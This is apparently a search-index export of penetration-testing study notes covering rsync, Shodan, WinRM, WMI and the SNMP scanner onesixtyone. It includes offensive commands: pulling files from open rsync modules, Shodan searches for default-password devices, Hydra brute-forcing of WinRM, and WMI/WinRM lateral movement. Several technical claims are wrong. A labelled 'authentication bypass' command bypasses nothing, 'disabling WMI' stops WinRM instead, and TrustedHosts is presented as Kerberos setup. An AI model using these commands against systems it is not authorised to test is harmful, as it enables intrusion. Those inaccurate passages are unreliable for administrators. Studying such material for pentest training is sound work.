comparison.\n\n---\n\n#### **9. Sync Files Over SSH with Custom Port**\n\nSpecify a custom SSH port for secure file transfers.\n\n```bash\nrsync -e 'ssh -p 2222' &lt;source&gt; &lt;user&gt;@&lt;destination&gt;:/path\n</code></pre> <li> <p><code>-e 'ssh -p 2222'</code>: Uses SSH on port <code>2222</code> for transfer.</p> </li>"},{"location":"CPTS/Tools/Rsync/#10-log-transfer-details","title":"10. Log Transfer Details","text":"<p>Write a detailed log of the transfer to a file.</p> <pre><code>rsync -av --log-file=/path/to/logfile.log &lt;source&gt; &lt;destination&gt;\n</code></pre> <ul> <li><code>--log-file</code>: Outputs transfer details to a specified log file.</li> </ul>"},{"location":"CPTS/Tools/Rsync/#11-limit-maximum-file-size","title":"11. Limit Maximum File Size","text":"<p>Transfer only files below a specific size.</p> <pre><code>rsync -av --max-size='10M' &lt;source&gt; &lt;destination&gt;\n</code></pre> <ul> <li><code>--max-size='10M'</code>: Limits transfer to files smaller than 10 MB.</li> </ul>"},{"location":"CPTS/Tools/Rsync/#12-backup-deleted-or-overwritten-files","title":"12. Backup Deleted or Overwritten Files","text":"<p>Keep backups of files that are deleted or overwritten during transfer.</p> <pre><code>rsync -av --backup --backup-dir=/path/to/backup &lt;source&gt; &lt;destination&gt;\n</code></pre> <ul> <li><code>--backup</code>: Enables backups.</li> <li><code>--backup-dir=/path/to/backup</code>: Specifies the backup directory.</li> </ul>"},{"location":"CPTS/Tools/Rsync/#13-show-progress-during-transfer","title":"13. Show Progress During Transfer","text":"<p>Track progress for large transfers.</p> <pre><code>rsync -av --progress &lt;source&gt; &lt;destination&gt;\n</code></pre> <ul> <li><code>--progress</code>: Displays transfer progress.</li> </ul>"},{"location":"CPTS/Tools/Rsync/#14-hard-link-preservation","title":"14. Hard-Link Preservation","text":"<p>Preserve hard links in the source directory.</p> <pre><code>rsync -avH &lt;source&gt; &lt;destination&gt;\n</code></pre> <ul> <li><code>-H</code>: Ensures hard links are maintained.</li> </ul>"},{"location":"CPTS/Tools/Rsync/#15-partial-transfers","title":"15. Partial Transfers","text":"<p>Resume interrupted transfers instead of starting over.</p> <pre><code>rsync -av --partial &lt;source&gt; &lt;destination&gt;\n</code></pre> <ul> <li><code>--partial</code>: Keeps partially transferred files for resumption.</li> </ul>"},{"location":"CPTS/Tools/Rsync/#example-penetration-testing-commands","title":"Example Penetration Testing Commands","text":""},{"location":"CPTS/Tools/Rsync/#scan-and-list-publicly-accessible-rsync-modules","title":"Scan and List Publicly Accessible Rsync Modules","text":"<pre><code>rsync --list-only rsync://&lt;target_ip&gt;/\n</code></pre>"},{"location":"CPTS/Tools/Rsync/#retrieve-files-from-an-rsync-module","title":"Retrieve Files from an Rsync Module","text":"<pre><code>rsync -av rsync://&lt;target_ip&gt;/&lt;module_name&gt;/ &lt;local_path&gt;\n</code></pre>"},{"location":"CPTS/Tools/Rsync/#scan-for-rsync-with-nmap","title":"Scan for Rsync with [[Nmap]]","text":"<p><code>bash nmap -p 873 --script rsync-list-modules &lt;target_ip&gt;</code></p> <ul> <li><code>rsync-list-modules</code>: Lists available Rsync modules.</li> </ul>"},{"location":"CPTS/Tools/Rsync/#key-takeaways","title":"Key Takeaways","text":"<ul> <li>Rsync's versatility makes it indispensable for secure file transfers, backups, and synchronization.</li> <li>Advanced options like compression, checksums, and partial transfers enhance efficiency.</li> <li>Misconfigured Rsync services are a valuable penetration testing target.</li> </ul> <p>Exam Priority: High Techniques/Tools: Rsync, SSH, Exclusion Rules, Delta Transfers Tags: #Rsync #AdvancedCommands #Pentesting</p>"},{"location":"CPTS/Tools/Shodan/","title":"Shodan","text":"<p>[!tip]- Tips Write tips here</p>"},{"location":"CPTS/Tools/Shodan/#references","title":"References","text":"<ul> <li>Layered Enumeration Framework Guide</li> <li>Comprehensive OSCP Enumeration Strategies</li> </ul>"},{"location":"CPTS/Tools/Shodan/#what-is-shodan","title":"What is Shodan?","text":"<p>Shodan is used to:</p> <ul> <li>Find exposed services/devices on the internet (e.g., IoT devices, webcams, databases).</li> <li>Identify vulnerabilities based on software and versions.</li> <li>Analyze network exposure and security posture.</li> </ul>"},{"location":"CPTS/Tools/Shodan/#setting-up-a-shodan-account","title":"Setting Up a Shodan Account","text":"<ol> <li>Go to Shodan and create a free or paid account.</li> <li>Obtain your API Key from your account page for CLI or automation.</li> </ol>"},{"location":"CPTS/Tools/Shodan/#installing-shodan-cli","title":"Installing Shodan CLI","text":"<p>To use Shodan\u2019s Command Line Interface:</p> <ol> <li>Install Python (if not already installed).</li> <li> <p>Install Shodan CLI:</p> <p><code>pip install shodan</code></p> </li> <li> <p>Authenticate with your API key:</p> <p><code>shodan init YOUR_API_KEY</code></p> </li> </ol>"},{"location":"CPTS/Tools/Shodan/#2-beginner-usage","title":"2. Beginner Usage","text":""},{"location":"CPTS/Tools/Shodan/#shodan-web-interface","title":"Shodan Web Interface","text":"<ul> <li>Search Basics: Enter keywords in the search bar to find exposed services.<ul> <li>Example: <code>apache</code> (find devices running Apache HTTP Server).</li> </ul> </li> <li>Filters:<ul> <li>Country: <code>country:US</code></li> <li>Port: <code>port:22</code></li> <li>Organization: <code>org:\"Google\"</code></li> <li>Product: <code>product:nginx</code></li> <li>Example: <code>apache country:US port:443</code></li> </ul> </li> </ul>"},{"location":"CPTS/Tools/Shodan/#shodan-cli-basics","title":"Shodan CLI Basics","text":""},{"location":"CPTS/Tools/Shodan/#1-search","title":"1. Search","text":"<p>Run a search query from the CLI: <pre><code>shodan search apache\n</code></pre></p>"},{"location":"CPTS/Tools/Shodan/#2-list-your-plans-limit","title":"2. List Your Plan's Limit","text":"<p>To check API limits and usage:</p> <pre><code>shodan info\n</code></pre>"},{"location":"CPTS/Tools/Shodan/#3-lookup-an-ip","title":"3. Lookup an IP","text":"<p>Get details about a specific IP address:</p> <pre><code>shodan host &lt;IP&gt;\n</code></pre>"},{"location":"CPTS/Tools/Shodan/#4-explore-scanned-services","title":"4. Explore Scanned Services","text":"<p>To see which ports Shodan has indexed globally:</p> <pre><code>shodan ports\n</code></pre>"},{"location":"CPTS/Tools/Shodan/#3-intermediate-usage","title":"3. Intermediate Usage","text":""},{"location":"CPTS/Tools/Shodan/#shodan-filters","title":"Shodan Filters","text":"<p>Combine multiple filters for more precise results:</p> <ul> <li>Basic Filters:<ul> <li><code>port:&lt;port&gt;</code>: Search for services running on a specific port.</li> <li><code>country:&lt;code&gt;</code>: Specify a country.</li> <li><code>city:&lt;name&gt;</code>: Narrow results to a specific city.</li> <li><code>product:&lt;name&gt;</code>: Search for a specific product (e.g., nginx, Apache).</li> </ul> </li> <li>Advanced Filters:<ul> <li><code>after:&lt;date&gt;</code> or <code>before:&lt;date&gt;</code>: Find results from specific timeframes.</li> <li><code>os:&lt;name&gt;</code>: Find devices by operating system.</li> <li><code>org:&lt;name&gt;</code>: Search by organization name.</li> </ul> </li> </ul> <p>Example:</p> <p><code>shodan search \"nginx country:DE port:443\"</code></p>"},{"location":"CPTS/Tools/Shodan/#file-output","title":"File Output","text":"<p>Export results to a file for later use:</p> <p><code>shodan search \"apache\" --limit 100 --fields ip_str,port,org --separator , &gt; results.csv</code></p> <p>Fields can include:</p> <ul> <li><code>ip_str</code>: IP Address.</li> <li><code>port</code>: Open port.</li> <li><code>org</code>: Organization.</li> <li><code>vulns</code>: List of vulnerabilities.</li> </ul>"},{"location":"CPTS/Tools/Shodan/#shodan-cli-commands","title":"Shodan CLI Commands","text":""},{"location":"CPTS/Tools/Shodan/#1-explore-scans","title":"1. Explore Scans","text":"<p>Get a list of available services scanned by Shodan:</p> <p><code>shodan services</code></p>"},{"location":"CPTS/Tools/Shodan/#2-scan-your-network","title":"2. Scan Your Network","text":"<p>To scan your own IP or range (requires a paid plan):</p> <p><code>shodan scan submit &lt;IP_OR_RANGE&gt;</code></p>"},{"location":"CPTS/Tools/Shodan/#3-retrieve-scan-results","title":"3. Retrieve Scan Results","text":"<p>After submission, get scan results:</p> <p><code>shodan scan download &lt;SCAN_ID&gt;</code></p>"},{"location":"CPTS/Tools/Shodan/#4-check-exploits","title":"4. Check Exploits","text":"<p>Search for known exploits using Shodan Exploits API:</p> <p><code>shodan exploits search \"cve-2022-1388\"</code></p>"},{"location":"CPTS/Tools/Shodan/#4-advanced-usage","title":"4. Advanced Usage","text":""},{"location":"CPTS/Tools/Shodan/#advanced-filters","title":"Advanced Filters","text":"<ul> <li> <p>SSL/TLS Certificates:</p> <ul> <li><code>ssl:\"&lt;string&gt;\"</code>: Search SSL certificates for specific strings.</li> <li>Example: <code>ssl:\"Let's Encrypt\"</code></li> <li> <p>HTTP Headers:</p> </li> <li> <p><code>http.title:\"&lt;string&gt;\"</code>: Search for devices with a specific webpage title.</p> </li> <li>Example: <code>http.title:\"Welcome to nginx!\"</code></li> <li> <p>Vulnerabilities:</p> </li> <li> <p><code>vuln:\"&lt;CVE-ID&gt;\"</code>: Search for devices with specific vulnerabilities.</p> </li> <li>Example: <code>vuln:\"CVE-2023-12345\"</code></li> </ul> </li> </ul>"},{"location":"CPTS/Tools/Shodan/#using-shodan-api","title":"Using Shodan API","text":""},{"location":"CPTS/Tools/Shodan/#python-script-example","title":"Python Script Example","text":"<p>Install the Python module:</p> <p><code>pip install shodan</code></p> <p>Example script:</p> <pre><code>import shodan  API_KEY = \"YOUR_API_KEY\" shodan_api = shodan.Shodan(API_KEY)  # Search for devices running nginx results = shodan_api.search(\"nginx\") print(f\"Total results: {results['total']}\")  for result in results['matches']:     print(f\"IP: {result['ip_str']}, Port: {result['port']}\")\n</code></pre>"},{"location":"CPTS/Tools/Shodan/#automated-monitoring","title":"Automated Monitoring","text":"<p>Use Shodan to monitor your network for exposure or vulnerabilities:</p> <ol> <li> <p>Add Alert:</p> <p><code>shodan alert create \"My Network\" &lt;IP_OR_RANGE&gt;</code></p> </li> <li> <p>Get Alerts:</p> <p><code>shodan alert list</code></p> </li> </ol>"},{"location":"CPTS/Tools/Shodan/#analyzing-results-with-json","title":"Analyzing Results with JSON","text":"<p>Shodan CLI outputs JSON by default. You can process it with tools like <code>jq</code>:</p> <p>bash</p> <p>Copy code</p> <p><code>shodan search \"nginx\" --limit 10 --fields ip_str,port,vulns | jq .</code></p>"},{"location":"CPTS/Tools/Shodan/#shodan-maps","title":"Shodan Maps","text":"<p>Visualize search results on a map (requires a paid plan):</p> <ol> <li> <p>Export data:</p> <p>bash</p> <p>Copy code</p> <p><code>shodan search \"nginx\" --limit 100 --fields ip_str,port,location.latitude,location.longitude &gt; map_data.csv</code></p> </li> <li> <p>Use tools like Google Maps or Python libraries (e.g., Folium) to plot results.</p> </li> </ol>"},{"location":"CPTS/Tools/Shodan/#5-tips-and-tricks","title":"5. Tips and Tricks","text":""},{"location":"CPTS/Tools/Shodan/#1-focus-on-high-value-targets","title":"1. Focus on High-Value Targets","text":"<p>Look for misconfigured devices or forgotten services using:</p> <ul> <li><code>default password</code> searches.</li> <li>Exposed databases (<code>product:mongodb</code>, <code>product:mysql</code>).</li> <li>Misconfigured cameras (<code>webcam</code> or <code>axis</code>).</li> </ul>"},{"location":"CPTS/Tools/Shodan/#2-refine-searches","title":"2. Refine Searches","text":"<p>Combine multiple filters to refine results:</p> <p>bash</p> <p>Copy code</p> <p><code>shodan search \"default password country:US port:80\"</code></p>"},{"location":"CPTS/Tools/Shodan/#3-avoid-overwhelming-data","title":"3. Avoid Overwhelming Data","text":"<p>Limit results to a manageable number:</p> <p>bash</p> <p>Copy code</p> <p><code>shodan search \"nginx\" --limit 50</code></p>"},{"location":"CPTS/Tools/Shodan/#4-stay-anonymous","title":"4. Stay Anonymous","text":"<p>Shodan queries don't expose your IP, but use VPN/proxies for accessing exposed systems ethically.</p>"},{"location":"CPTS/Tools/Shodan/#5-use-reports","title":"5. Use Reports","text":"<p>Export reports for compliance or team sharing:</p> <p>bash</p> <p>Copy code</p> <p><code>shodan myip &gt; report.txt</code></p>"},{"location":"CPTS/Tools/Shodan/#6-best-practices","title":"6. Best Practices","text":"<ul> <li>Legal Boundaries: Ensure you have permission before exploring or interacting with exposed systems.</li> <li>Ethical Use: Use Shodan for research, compliance, and security assessments only.</li> <li>Regular Monitoring: Continuously monitor your organization\u2019s IP ranges for exposed devices.</li> </ul>"},{"location":"CPTS/Tools/Shodan/#common-cli-commands-summary","title":"Common CLI Commands Summary","text":"Command Description <code>shodan init YOUR_API_KEY</code> Initialize Shodan CLI with your API key. <code>shodan search &lt;query&gt;</code> Perform a search query. <code>shodan host &lt;IP&gt;</code> Get details of a specific host. <code>shodan services</code> List common services scanned by Shodan. <code>shodan scan submit &lt;IP_OR_RANGE&gt;</code> Submit a scan request (requires a paid account). <code>shodan alert create \"Name\" &lt;IP_OR_RANGE&gt;</code> Create an alert for specific IPs or ranges. <code>shodan exploits search \"&lt;CVE-ID&gt;\"</code> Search for exploits by CVE ID or keywords."},{"location":"CPTS/Tools/WinRM/","title":"WinRM","text":"<p>[!tip]- Tips Write tips here</p>"},{"location":"CPTS/Tools/WinRM/#references","title":"References","text":"<ul> <li>Layered Enumeration Framework Guide</li> <li>Comprehensive OSCP Enumeration Strategies</li> </ul> <p>Overview Windows Remote Management (WinRM) is a Windows-based protocol that allows administrators to remotely manage systems via the command line. It is designed to help manage Windows machines, execute commands remotely, and automate administrative tasks. It is based on the Simple Object Access Protocol (SOAP) and relies on HTTP and HTTPS for communication.</p> <p>WinRM must be explicitly enabled and configured starting from Windows 10. On Windows Server 2012 and later, WinRM is enabled by default, but proper configuration and firewall exceptions are still required for it to function properly.</p>"},{"location":"CPTS/Tools/WinRM/#ports-and-communication","title":"Ports and Communication","text":"<p>WinRM uses the following ports for communication:</p> <ul> <li>Port 5985 (HTTP): For unencrypted communication.</li> <li>Port 5986 (HTTPS): For encrypted communication (uses SSL/TLS).</li> </ul> <p>These ports replaced 80 and 443, which were previously used for SOAP communication but were blocked for security reasons in modern environments.</p>"},{"location":"CPTS/Tools/WinRM/#winrm-components","title":"WinRM Components","text":"<ol> <li> <p>Windows Remote Shell (WinRS):</p> <ul> <li>A command-line tool that allows you to execute commands on remote systems via WinRM.</li> <li>Included by default on Windows 7 and later versions.</li> <li> <p>PowerShell Remoting:</p> </li> <li> <p>WinRM is the underlying protocol used for PowerShell Remoting, allowing administrators to manage remote systems and execute commands or scripts.</p> </li> <li> <p>Event Log Merging:</p> </li> <li> <p>WinRM can be used to merge event logs from multiple systems, enabling centralized log management.</p> </li> </ul> </li> </ol>"},{"location":"CPTS/Tools/WinRM/#enabling-and-configuring-winrm","title":"Enabling and Configuring WinRM","text":"<p>On Windows 10 and Server (pre-2012): To enable WinRM, the following steps can be used:</p> <ul> <li> <p>Enable WinRM on a local machine:     Open PowerShell as an administrator and run the following command:</p> <p>powershell</p> <p>Copy code</p> <p><code>winrm quickconfig</code></p> <p>This will enable the service and configure it to start automatically, allowing connections.</p> </li> <li> <p>Enable WinRM on a remote machine: Run the same command on the target machine, or use PowerShell Remoting to enable it:</p> <p>powershell</p> <p>Copy code</p> <p><code>Invoke-Command -ComputerName &lt;target-computer&gt; -ScriptBlock { winrm quickconfig }</code></p> </li> </ul> <p>Configure Firewall to Allow WinRM: To allow WinRM traffic, the firewall must allow inbound connections on ports 5985 (HTTP) and 5986 (HTTPS). You can add a rule to the firewall to enable this:</p> <p>powershell</p> <p>Copy code</p> <p><code>New-NetFirewallRule -Name WinRM -DisplayName \"Windows Remote Management\" -Enabled True -Protocol TCP -LocalPort 5985,5986 -Action Allow</code></p>"},{"location":"CPTS/Tools/WinRM/#common-winrm-commands","title":"Common WinRM Commands","text":"<ol> <li> <p>Check WinRM Status:     To check whether WinRM is configured correctly:</p> <p>powershell</p> <p>Copy code</p> <p><code>winrm enumerate winrm/config/listener</code></p> </li> <li> <p>Start WinRM Service:     If WinRM is disabled, you can start the service with:</p> <p>powershell</p> <p>Copy code</p> <p><code>Start-Service winrm</code></p> </li> <li> <p>Testing Remote WinRM Connection:     Use the following command to test if the remote machine is accessible via WinRM:</p> <p>powershell</p> <p>Copy code</p> <p><code>Test-WsMan &lt;remote-hostname-or-IP&gt;</code></p> </li> <li> <p>Remote Command Execution Using WinRS:     To execute a command on a remote machine:</p> <p>powershell</p> <p>Copy code</p> <p><code>winrs -r:&lt;remote-hostname-or-IP&gt; cmd.exe /c \"dir C:\\\"</code></p> </li> <li> <p>PowerShell Remoting:     To start a remote PowerShell session:</p> <p>powershell</p> <p>Copy code</p> <p><code>Enter-PSSession -ComputerName &lt;remote-hostname-or-IP&gt; -Credential &lt;username&gt;</code></p> <p>To execute commands remotely:</p> <p>powershell</p> <p>Copy code</p> <p><code>Invoke-Command -ComputerName &lt;remote-hostname&gt; -ScriptBlock { Get-Process }</code></p> </li> </ol>"},{"location":"CPTS/Tools/WinRM/#advanced-winrm-techniques","title":"Advanced WinRM Techniques","text":"<ol> <li> <p>Kerberos Authentication for WinRM:     WinRM supports Kerberos authentication if the machines are part of the same domain. This adds an additional layer of security by using encrypted credentials. To enable Kerberos authentication:</p> <ul> <li>Ensure that both the client and the target machine are in the same Active Directory domain.</li> <li> <p>Use the following command to configure WinRM to use Kerberos:</p> <p>powershell</p> <p>Copy code</p> <p><code>Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value &lt;target-hostname-or-IP&gt;</code></p> </li> </ul> </li> <li> <p>Custom WinRM Listeners:     By default, WinRM listens on ports 5985 and 5986, but custom ports can be configured. To create a new listener on a different port:</p> <p>powershell</p> <p>Copy code</p> <p><code>winrm create winrm/config/Listener?Address=*+Transport=HTTPS @{Port=\"8080\"}</code></p> </li> <li> <p>Using HTTPS with WinRM:     If HTTPS is required for secure communication, an SSL certificate must be installed on the target machine. Here's how to configure WinRM to use HTTPS:</p> <p>powershell</p> <p>Copy code</p> <p><code>winrm create winrm/config/Listener?Address=*+Transport=HTTPS @{Port=\"5986\";CertificateThumbprint=\"&lt;thumbprint-of-ssl-certificate&gt;\"}</code></p> </li> <li> <p>Configuring WinRM for Remote Powershell Sessions:     In environments where PowerShell remoting is needed, configure the WinRM listener to support remote connections securely:</p> <p>powershell</p> <p>Copy code</p> <p><code>Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value \"&lt;remote-hostname&gt;\"</code></p> </li> <li> <p>Bypass Authentication (for Testing):     For penetration testing or lab environments, it's sometimes useful to bypass authentication (such as NTLM) to connect via WinRM. To do this, you can use Powershell remoting over HTTP:</p> <p>powershell</p> <p>Copy code</p> <p><code>Enter-PSSession -ComputerName &lt;target-hostname-or-IP&gt; -Authentication Negotiate -Credential &lt;username&gt;</code></p> </li> <li> <p>Exploiting WinRM (Brute-forcing):     For penetration testing, WinRM can be targeted using brute force techniques, especially if weak credentials are suspected. Tools like Hydra can be used to brute force the WinRM service:</p> <p>bash</p> <p>Copy code</p> <p><code>hydra -l &lt;username&gt; -P &lt;password-list&gt; winrm://&lt;target-IP&gt;:5985</code></p> </li> <li> <p>Using WinRM for Lateral Movement:     If you have gained access to one machine, you can use WinRM for lateral movement to other systems within the network. Once WinRM is configured, use PowerShell remoting to execute commands on other machines:</p> <p>powershell</p> <p>Copy code</p> <p><code>Invoke-Command -ComputerName &lt;remote-machine&gt; -ScriptBlock { &lt;command-to-execute&gt; }</code></p> </li> </ol>"},{"location":"CPTS/Tools/WinRM/#security-and-mitigation","title":"Security and Mitigation","text":"<ol> <li> <p>Securing WinRM:</p> <ul> <li>Always use HTTPS (port 5986) to encrypt traffic.</li> <li>Implement strong authentication mechanisms like Kerberos or NTLMv2 and avoid weak passwords.</li> <li>Restrict access to WinRM using firewall rules and ensure only trusted machines or users can connect.</li> <li> <p>WinRM Hardening:</p> </li> <li> <p>Disable WinRS if not required.</p> </li> <li>Enable Network Level Authentication (NLA) for more secure connections.</li> <li>Ensure that SSL certificates are properly managed, and do not rely on self-signed certificates for production environments.</li> <li> <p>Monitoring WinRM Access:</p> </li> <li> <p>Use Windows Event Logs to monitor access and failures related to WinRM.</p> </li> <li>Track WinRM connections with Audit Policy and enable logging for both successful and failed login attempts.</li> <li> <p>Restricting WinRM Access:</p> </li> <li> <p>Limit trusted hosts to only necessary machines:</p> <p>powershell</p> <p>Copy code</p> <p><code>Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value &lt;target-IP&gt;</code> </p> </li> <li> <p>Regularly review and adjust firewall rules to limit the IP ranges that can access WinRM services.</p> </li> </ul> </li> </ol>"},{"location":"CPTS/Tools/WinRM/#key-oscp-takeaways","title":"Key OSCP Takeaways","text":"<ul> <li>Footprinting and Recon: Use tools like Nmap to identify systems with open WinRM ports.</li> <li>Exploitation: Target weak configurations, such as lack of encryption or poor authentication settings, for exploitation.</li> <li>Mitigation: Enforce strong authentication (Kerberos, NTLMv2), enable encryption (HTTPS), and restrict access with firewalls and proper configuration.</li> </ul>"},{"location":"CPTS/Tools/Windows_Management_Instrumentation/","title":"Windows Management Instrumentation","text":"<p>Overview Windows Management Instrumentation (WMI) is Microsoft's implementation of the Common Information Model (CIM), which is a standard for representing management data in an enterprise environment. It is a core component of the Web-Based Enterprise Management (WBEM) initiative and provides a standardized way to access management information in Windows systems.</p> <p>WMI allows for read and write access to nearly all settings on Windows systems, including hardware and software configurations. This extensive functionality makes WMI the most critical interface for system administration and remote management of Windows computers, whether they are personal computers (PCs) or servers. WMI plays a key role in system monitoring, configuration, and automation tasks.</p>"},{"location":"CPTS/Tools/Windows_Management_Instrumentation/#key-components-of-wmi","title":"Key Components of WMI","text":"<p>WMI is not a single program but a collection of various components, including:</p> <ol> <li> <p>WMI Providers:     Providers are modules that provide access to the various management information in the Windows system. Each provider manages a specific type of data, such as hardware details, system configurations, performance metrics, or network settings.</p> </li> <li> <p>WMI Repository:     The WMI repository is a database that stores the WMI data. It contains management information and the schema that describes how this data is structured. The repository is typically located in the <code>C:\\Windows\\System32\\wbem\\Repository</code> directory.</p> </li> <li> <p>WMI Command-line (WMIC):     WMIC is a command-line interface (CLI) tool used to interact with WMI and query or modify system information. It is a powerful tool for system administrators and can be used for troubleshooting, configuration, and automation.</p> </li> <li> <p>WMI Scripting Interfaces:     WMI can be accessed through scripting languages such as PowerShell and VBScript, which allow administrators to write custom scripts to interact with Windows management data.</p> </li> </ol>"},{"location":"CPTS/Tools/Windows_Management_Instrumentation/#accessing-wmi","title":"Accessing WMI","text":"<ol> <li> <p>PowerShell:     PowerShell is the most common method for interacting with WMI. The <code>Get-WmiObject</code> cmdlet allows users to query WMI data from remote systems or local machines.</p> <p>powershell</p> <p>Copy code</p> <p><code>Get-WmiObject -Class Win32_OperatingSystem</code></p> <p>This command retrieves information about the operating system from the local machine.</p> </li> <li> <p>WMIC:     WMIC provides a CLI interface to WMI and is used for querying system information and performing management tasks. Example:</p> <p>cmd</p> <p>Copy code</p> <p><code>wmic os get caption, version</code></p> <p>This command retrieves the OS version and name of the local machine.</p> </li> <li> <p>VBScript:     VBScript can also be used to query WMI, though it is less commonly used than PowerShell. Here is an example of a script that queries the system information:</p> <p>vbscript</p> <p>Copy code</p> <p><code>Set objWMIService = GetObject(\"winmgmts:\\\\.\\root\\cimv2\") Set colItems = objWMIService.ExecQuery(\"Select * from Win32_OperatingSystem\") For Each objItem in colItems     Wscript.Echo objItem.Caption Next</code></p> </li> </ol>"},{"location":"CPTS/Tools/Windows_Management_Instrumentation/#common-wmi-classes","title":"Common WMI Classes","text":"<ol> <li> <p>Win32_OperatingSystem:     This class provides information about the operating system. It includes details such as the name, version, architecture, and installation date. Example query:</p> <p>powershell</p> <p>Copy code</p> <p><code>Get-WmiObject -Class Win32_OperatingSystem</code></p> </li> <li> <p>Win32_ComputerSystem:     This class provides information about the computer system, such as the manufacturer, model, and the number of processors. Example query:</p> <p>powershell</p> <p>Copy code</p> <p><code>Get-WmiObject -Class Win32_ComputerSystem</code></p> </li> <li> <p>Win32_NetworkAdapterConfiguration:     This class provides information about network adapter configurations, including IP addresses and DNS settings. Example query:</p> <p>powershell</p> <p>Copy code</p> <p><code>Get-WmiObject -Class Win32_NetworkAdapterConfiguration</code></p> </li> <li> <p>Win32_Service:     This class is used to retrieve information about services running on the system. It can also be used to start, stop, or modify services. Example query:</p> <p>powershell</p> <p>Copy code</p> <p><code>Get-WmiObject -Class Win32_Service</code></p> </li> <li> <p>Win32_Process:     This class provides details about the processes running on the system, including their process IDs, memory usage, and names. Example query:</p> <p>powershell</p> <p>Copy code</p> <p><code>Get-WmiObject -Class Win32_Process</code></p> </li> <li> <p>Win32_PhysicalMemory:     This class provides information about the physical memory (RAM) installed on the system, including size and type. Example query:</p> <p>powershell</p> <p>Copy code</p> <p><code>Get-WmiObject -Class Win32_PhysicalMemory</code></p> </li> </ol>"},{"location":"CPTS/Tools/Windows_Management_Instrumentation/#advanced-wmi-usage","title":"Advanced WMI Usage","text":"<ol> <li> <p>Querying Remote Machines via WMI     WMI can be used to query information on remote systems. To do this, you must have the appropriate credentials and permissions. Here's an example of querying a remote machine:</p> <p>powershell</p> <p>Copy code</p> <p><code>Get-WmiObject -Class Win32_OperatingSystem -ComputerName &lt;remote-computer-name&gt; -Credential &lt;username&gt;</code></p> </li> <li> <p>Performing Remote Commands     PowerShell remoting can be combined with WMI to perform actions on remote systems. Use the following to invoke a command remotely:</p> <p>powershell</p> <p>Copy code</p> <p><code>Invoke-Command -ComputerName &lt;remote-computer&gt; -ScriptBlock { Get-WmiObject -Class Win32_OperatingSystem }</code></p> </li> <li> <p>WMI Event Subscription     WMI allows you to subscribe to events, such as when a process starts or when the system shuts down. To listen for an event, use the <code>Register-WmiEvent</code> cmdlet:</p> <p>powershell</p> <p>Copy code</p> <p><code>Register-WmiEvent -Query \"SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_Process'\" -Action { Write-Host \"New process started!\" }</code></p> <p>This command will notify the user whenever a new process starts on the system.</p> </li> <li> <p>Querying WMI with SQL-like Syntax     WMI queries can be written using WQL (WMI Query Language), which has SQL-like syntax. Here's an example:</p> <p>powershell</p> <p>Copy code</p> <p><code>Get-WmiObject -Query \"SELECT * FROM Win32_Process WHERE Name = 'explorer.exe'\"</code></p> </li> </ol>"},{"location":"CPTS/Tools/Windows_Management_Instrumentation/#security-and-mitigation","title":"Security and Mitigation","text":"<ol> <li> <p>WMI Access Control     WMI provides access to critical system information and settings. Therefore, controlling access to WMI is important to prevent unauthorized access. WMI can be configured with permissions to allow or deny access to specific users or groups.</p> </li> <li> <p>Enabling WMI Security Logging     Enabling security auditing and logging for WMI activity is important for detecting potential abuse. This can be done through Windows Event Viewer by enabling auditing for \"Logon/Logoff\" and \"Account Logon\" events.</p> </li> <li> <p>WMI for Lateral Movement     Attackers can use WMI for lateral movement in a network. To mitigate this, ensure that WMI access is restricted to trusted users and that logging is enabled to detect unusual access patterns.</p> </li> <li> <p>Disabling WMI on Unused Machines     If WMI is not necessary on certain machines, it can be disabled using the following command:</p> <p>powershell</p> <p>Copy code</p> <p><code>Stop-Service -Name WinRM</code></p> </li> <li> <p>Use of WMI for Post-Exploitation     WMI is often used in post-exploitation scenarios to execute commands or collect information from compromised machines. Tools like PowerShell Empire and Cobalt Strike make extensive use of WMI for command execution and data exfiltration.</p> </li> </ol>"},{"location":"CPTS/Tools/Windows_Management_Instrumentation/#key-oscp-takeaways","title":"Key OSCP Takeaways","text":"<ul> <li>Footprinting and Recon: WMI is a valuable tool for gathering detailed system information. Use it to enumerate users, installed software, processes, and hardware configurations.</li> <li>Exploitation: If an attacker gains access to a machine, they can use WMI for lateral movement to other systems in the network.</li> <li>Mitigation: Restrict access to WMI using Group Policy or local security policies, enable logging, and regularly review WMI access for any suspicious activity.</li> </ul>"},{"location":"CPTS/Tools/onesixtyone/","title":"onesixtyone","text":"<p>[!tip]- Tips Write tips here</p>"},{"location":"CPTS/Tools/onesixtyone/#references","title":"References","text":"<ul> <li>Layered Enumeration Framework Guide</li> <li>Comprehensive OSCP Enumeration Strategies</li> </ul>"},{"location":"CPTS/Tools/onesixtyone/#onesixtyone-cheat-sheet","title":"Onesixtyone Cheat Sheet","text":""},{"location":"CPTS/Tools/onesixtyone/#overview","title":"Overview","text":"<p>Onesixtyone is a lightweight SNMP scanning tool designed to quickly identify SNMP-enabled devices on a network. It allows users to scan a range of IP addresses for open SNMP services and check for vulnerabilities by attempting to retrieve SNMP data using various community strings. Commonly used by network administrators and penetration testers, onesixtyone is an effective tool for identifying misconfigured SNMP services that may expose critical device information.</p>"},{"location":"CPTS/Tools/onesixtyone/#basic-syntax","title":"Basic Syntax","text":"<p>The basic syntax of onesixtyone is as follows:</p> <pre><code>onesixtyone -c &lt;community_file&gt; -i &lt;ip_file&gt;\n</code></pre> <ul> <li><code>-c &lt;community_file&gt;</code>: Specifies the file containing community strings (like passwords) to try against the SNMP service. Common community strings include <code>public</code>, <code>private</code>, and <code>community</code>.</li> <li><code>-i &lt;ip_file&gt;</code>: Specifies the file containing IP addresses to scan.</li> </ul> <p>Example:</p> <p>bash</p> <p>Copy code</p> <p><code>onesixtyone -c community.txt -i ips.txt</code></p> <p>This command scans the IP addresses in <code>ips.txt</code> using the community strings in <code>community.txt</code>.</p>"},{"location":"CPTS/Tools/onesixtyone/#setting-up-the-community-and-ip-files","title":"Setting Up the Community and IP Files","text":"<p>Community String File:</p> <ul> <li>The <code>community.txt</code> file contains a list of possible SNMP community strings, each on a new line.</li> <li> <p>Example:</p> <p>arduino</p> <p>Copy code</p> <p><code>public private secret community</code></p> </li> </ul> <p>IP Address File:</p> <ul> <li>The <code>ips.txt</code> file contains the IP addresses or IP ranges to be scanned.</li> <li> <p>Example:</p> <p>Copy code</p> <p><code>192.168.1.1 192.168.1.0/24</code></p> </li> </ul>"},{"location":"CPTS/Tools/onesixtyone/#basic-scanning-commands","title":"Basic Scanning 